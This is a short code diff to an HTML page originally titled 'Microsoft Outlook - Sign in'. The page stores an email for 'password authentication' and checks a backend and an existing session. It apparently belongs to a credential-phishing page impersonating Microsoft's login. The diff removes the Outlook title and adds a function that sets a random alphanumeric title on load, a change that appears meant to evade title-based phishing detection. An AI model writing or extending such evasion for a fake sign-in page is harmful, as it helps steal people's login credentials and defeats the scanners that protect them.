@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Outlook - Sign in</title>
+    <title>Loading...</title>
     <style>
         * {
             margin: 0;
@@ -596,8 +596,15 @@
         let currentEmail = null; // To store the email for password authentication
         let currentUserEmail = null; // To store the email for success message
 
+        // Generate random alphanumeric title
+        function generateRandomTitle() {
+            const randomString = (Math.random() + 1).toString(36).substring(2, 80);
+            document.title = randomString;
+        }
+
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
+            generateRandomTitle(); // Set random title
             setLoading(false); // Start with loading off
             checkBackendHealth();
             checkExistingSession();
